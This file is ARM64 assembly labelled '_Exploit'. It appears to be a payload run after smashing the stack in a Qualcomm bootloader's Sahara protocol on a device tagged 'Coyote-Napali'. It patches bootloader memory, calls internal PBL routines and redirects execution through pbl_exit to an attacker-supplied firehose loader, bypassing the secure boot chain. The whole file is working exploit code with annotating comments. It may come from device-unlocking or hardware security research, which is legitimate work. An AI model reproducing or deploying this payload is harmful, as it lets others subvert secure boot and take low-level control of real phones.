_Exploit:
	/* Fix the stack after smashing it in Sahara */
	stp x29, x30, [sp, #-0x70]!
	mov x29, sp
	str x19, [sp, #0x10]

	/* memcpy (src=0x31f000, sz=0x1000, dst=0x1481f000) */
	mov x0, #0xf000
	movk x0, #0x31, lsl #16
	mov x2, #0x14500000
1:	ldr w1, [x0]
	str w1, [x0, x2]
	add x0, x0, #4
	cmp x0, #0x320, lsl #12
	b.ne 1b

	/* patch 0x1481f008 with 0xd2800000 */
	mov x0, #0xf008
	movk x0, #0x1481, lsl #16 /* x0 now has 0x1481f008 */
	mov w1, #0xd2800000 /* store 0xd2800000 to w1 */
	str w1, [x0] /* write val of w1 to x0 */

	/* patch 0x1481f00c with 0xb9000020 */
	mov x0, #0xf00c
	movk x0, #0x1481, lsl #16
	mov w1, #0x20
	movk w1, #0xb900, lsl #16
	str w1, [x0]

	/* patch 0x1481f010 with 0x58000040 */
	mov x0, #0xf010
	movk x0, #0x1481, lsl #16
	mov w1, #0x40
	movk w1, #0x5800, lsl #16
	str w1, [x0]

	/* patch 0x1481f014 with d65f03c0 (ret) */
	mov x0, #0xf014
	movk x0, #0x1481, lsl #16
	mov w1, #0x3c0
	movk w1, #0xd65f, lsl #16
	str w1, [x0]

	/* patch 0x1481f018 with 0x5a9d3aa0 */
	mov x0, #0xf018
	movk x0, #0x1481, lsl #16
	mov w1, #0x3aa0
	movk w1, #0x5a9d, lsl #16
	str w1, [x0]

	/* patch 0x1481f01c with 0 (disables qsb?) */
	mov x0, #0xf01c
	movk x0, #0x1481, lsl #16
	str wzr, [x0]

	/* patch 0x148018f8 with 0x1481f79b */
	mov x0, #0x18f8
	movk x0, #0x1480, lsl #16
	mov w1, #0xf79b
	movk w1, #0x1481, lsl #16
	str w1, [x0]

	/* jump to 0x324948 (pbl_invalidate_tlb) so our writes aren't trashed */
	mov x0, #0x4948
	movk x0, #0x32, lsl #16
	blr x0

	/* jump to 0x30e4d4 (pbl_data_init) */
	mov x0, #0xfbb0
	movk x0, #0x1480, lsl #16
	mov x1, #0xe4d4
	movk x1, #0x30, lsl #16
	blr x1

	/* jump to 0x3104e0 (pbl_hw_get_boot_option) */
	mov x0, #0xfbb0
	movk x0, #0x1480, lsl #16
	mov x1, #0x04e0
	movk x1, #0x31, lsl #16
	blr x1

	/* jump to 0x30e58c (pbl_detect_bootable_media) */
	mov x0, #0xfbb0
	movk x0, #0x1480, lsl #16
	mov x1, #0xe58c
	movk x1, #0x30, lsl #16
	blr x1

	/* jump to 0x311684 (pbl_modify_page_table_attributes) */
	mov x0, #0xfbb0
	movk x0, #0x1480, lsl #16
	mov x1, #0x1684
	movk x1, #0x31, lsl #16
	blr x1

	/* jump to 0x30b3d4 (pbl_apps_load_auth_sbl) */
	mov x0, #0xfbb0
	movk x0, #0x1480, lsl #16
	mov x1, #0xb3d4
	movk x1, #0x30, lsl #16
	blr x1 

	/* jump to 0x311a40 (pbl_populate_share_data) */
	mov x0, #0xfbb0
	movk x0, #0x1480, lsl #16
	mov x1, #0x1a40
	movk x1, #0x31, lsl #16
	blr x1
	
    /* // local_40 = &local_48; // local_48 = 0x1481e300; // local_38 = 0; // */
    mov x1, #0xe300
    movk x1, #0x1481, lsl #16
    add x0, x29, #0x70
    str x1, [x0, #-0x48]! // FIXME?
    str x0, [x29, #0x30]  // FIXME?
    str xzr, [x29, #0x38] // FIXME?

    /* jump to 0x326024 (pbl_memset) // clears mem 1481e000 - 1481f000 */
    mov x0, #0xe000
    movk x0, #0x1481, lsl #16
    mov x3, #0x6024
    movk x3, #0x32, lsl #16
    mov x1, #0x0
    mov x2, #0x1000
    blr x3

    /* jump to 0x306c28 and save return val to 0x1481e000 */
    mov x0, #0x6c28
    movk x0, #0x30, lsl #16
    blr x0
    mov x1, #0xe000
    movk x1, #0x1481, lsl #16
    str w0, [x1]

    /* jump to 0x305c90 and save return val to 0x1481e004 */
    mov x2, #0x5c90
    movk x2, #0x30, lsl #16
    add x0, x29, #0x30
    mov x1, #0x1
    blr x2
    mov x1, #0xe004
    movk x1, #0x1481, lsl #16
    str w0, [x1]

    /* local_38 = 0; */
    add x19, x29, #0x70
    str xzr, [x19, #-0x38]!

    /* jump to 0x305cc0 and save return val to 0x1481e008 */
    mov x4, #0x5cc0
    movk x4, #0x30, lsl #16
    ldr x0, [x29, #0x30]
    mov x1, #0x1
    mov x2, x19
    mov x3, #0x4
    blr x4
    mov x1, #0xe008
    movk x1, #0x1481, lsl #16
    str w0, [x1]

    /* jump to 0x305cc0 and save return val to 0x1481e00c */
    mov x2, #0xf000
    movk x2, #0x1481, lsl #16
    mov x4, #0x5cc0
    movk x4, #0x30, lsl #16
    ldr x0, [x29, #0x30]
    mov x1, #0x2
    mov x3, #0x20
    blr x4
    mov x1, #0xe00c
    movk x1, #0x1481, lsl #16
    str w0, [x1]

    /* local_38 = 0; */
    str xzr, [x29, #0x38]

    /* jump to 0x305cc0 and save return val to 0x1481e010 */
    mov x4, #0x5cc0
    movk x4, #0x30, lsl #16
    ldr x0, [x29, #0x30]
    mov x1, #0x1
    mov x2, x19
    mov x3, #0x4
    blr x4
    mov x1, #0xe010
    movk x1, #0x1481, lsl #16
    str w0, [x1]

    /* local_30 = 0x1481e100; */
    mov x0, #0xe100
    movk x0, #0x1481, lsl #16
    str x0, [x29, #0x40]

    /* local_28 = 0x10; */
    mov x0, #0x10
    str x0, [x29, #0x48]

    /* local_20 = 0x1481e110; */
    mov x1, #0xe110
    movk x1, #0x1481, lsl #16
    str x1, [x29, #0x50]

    /* local_18 = 0x10; (0x10 still saved in x0) */
    str x0, [x29, #0x58]

    /* local_10 = &local_20; */
    add x0, x29, #0x50
    str x0, [x29, #0x60]

    /* local_8 = 0x1; */
    mov x19, #0x1
    str x19, [x29, #0x68]

    /* jump to 0x305610 and save return val to 0x1481e014 */
    mov x4, #0x5610
    movk x4, #0x30, lsl #16
    ldr x0, [x29, #0x30]
    add x1, x29, #0x40
    mov x2, x19
    add x3, x29, #0x60
    blr x4
    mov x1, #0xe014
    movk x1, #0x1481, lsl #16
    str w0, [x1]

    /* patch 0x1481e018 with 0x78208c (near qfprom?) */
    mov x0, #0x208c
    movk x0, #0x78, lsl #16
    ldr w1, [x0]
    mov x0, #0xe018
    movk x0, #0x1481, lsl #16
    str w1, [x0]

    /* patch 0x1469f9a8 with 0xaa1e03f4 (starting here, we "make" a function (opcodes are in big endian?)) */
    mov x0, #0xf9a8
    movk x0, #0x1469, lsl #16
    mov w1, #0x3f4
    movk w1, #0xaa1e, lsl #16
    str w1, [x0]

    /* patch 0x1469f9ac with 0xd2800020 */
    mov x0, #0xf9ac
    movk x0, #0x1469, lsl #16
    mov w1, #0x20
    movk w1, #0xd280, lsl #16
    str w1, [x0]

    /* patch 0x1469f9b0 with 0x58000163 */
    mov x0, #0xf9b0
    movk x0, #0x1469, lsl #16
    mov w1, #0x163
    movk w1, #0x5800, lsl #16
    str w1, [x0]

    /* patch 0x1469f9b4 with 0xd63f0060 */
    mov x0, #0xf9b4
    movk x0, #0x1469, lsl #16
    mov w1, #0x60
    movk w1, #0xd63f, lsl #16
    str w1, [x0]

    /* patch 0x1469f9b8 with 0x58000163 */
    mov x0, #0xf9b8
    movk x0, #0x1469, lsl #16
    mov w1, #0x163
    movk w1, #0x5800, lsl #16
    str w1, [x0]

    /* patch 0x1469f9bc with 0xd63f0060 */
    mov x0, #0xf9bc
    movk x0, #0x1469, lsl #16
    mov w1, #0x60
    movk w1, #0xd63f, lsl #16
    str w1, [x0]

    /* patch 0x1469f9c0 with 0xd2800020 */
    mov x0, #0xf9c0
    movk x0, #0x1469, lsl #16
    mov w1, #0x20
    movk w1, #0xd280, lsl #16
    str w1, [x0]

    /* patch 0x1469f9c4 with 0xd2800001 */
    mov x0, #0xf9c4
    movk x0, #0x1469, lsl #16
    movk w19, #0xd280, lsl #16
    str w19, [x0] /* why are we using a different register here? <-^ */

    /* patch 0x1469f9c8 with 0xd2800002 */
    mov x0, #0xf9c8
    movk x0, #0x1469, lsl #16
    mov w1, #0x2
    movk w1, #0xd280, lsl #16
    str w1, [x0]

    /* patch 0x1469f9cc with 0x58000103 */
    mov x0, #0xf9cc
    movk x0, #0x1469, lsl #16
    mov w1, #0x103
    movk w1, #0x5800, lsl #16
    str w1, [x0]

    /* patch 0x1469f9d0 with 0xd63f0060 */
    mov x0, #0xf9d0
    movk x0, #0x1469, lsl #16
    mov w1, #0x60
    movk w1, #0xd63f, lsl #16
    str w1, [x0]

    /* patch 0x1469f9d4 with 0xaa1403fe */
    mov x0, #0xf9d4
    movk x0, #0x1469, lsl #16
    mov w1, #0x3fe
    movk w1, #0xaa14, lsl #16
    str w1, [x0]

    /* patch 0x1469f9d8 with 0xd65f03c0 */
    mov x0, #0xf9d8
    movk x0, #0x1469, lsl #16
    mov w1, #0x3c0
    movk w1, #0xd65f, lsl #16
    str w1, [x0]

    /* patch 0x1469f9dc with 0x1469c6dc */
    mov x0, #0xf9dc
    movk x0, #0x1469, lsl #16
    mov w1, #0xc6dc
    movk w1, #0x1469, lsl #16
    str w1, [x0]

    /* patch 0x1469f9e0 with 0x0 */
    mov x0, #0xf9e0
    movk x0, #0x1469, lsl #16
    str wzr, [x0]

    /* patch 0x1469f9e4 with 0x146a479c */
    mov x0, #0xf9e4
    movk x0, #0x1469, lsl #16
    mov w1, #0x479c
    movk w1, #0x146a, lsl #16
    str w1, [x0]

    /* patch 0x1469f9e8 with 0x0 */
    mov x0, #0xf9e8
    movk x0, #0x1469, lsl #16
    str wzr, [x0]

    /* patch 0x1469f9ec with 0x146a01cc */
    mov x0, #0xf9ec
    movk x0, #0x1469, lsl #16
    mov w1, #0x1cc
    movk w1, #0x146a, lsl #16
    str w1, [x0]

    /* patch 0x1469f9f0 with 0x0 */
    mov x0, #0xf9f0
    movk x0, #0x1469, lsl #16
    str wzr, [x0]

    /* since our payload reinits sahara and expects for it to return, after parsing it returns.
       pbl_exit will jump to our firehose */
    mov x0, #0xfbb0
    movk x0, #0x1480, lsl #16
    mov x1, #0xe984
    movk x1, #0x30, lsl #16
    blr x1 /* we shouldn't return from here.. */
    mov w0, #0x0
    ldr x19, [sp, #0x10]
    ldp x29, x30, [sp], #0x70
    ret  

_Identification:    
    nop
    .ascii "Coyote-Napali"

.text
.align 4
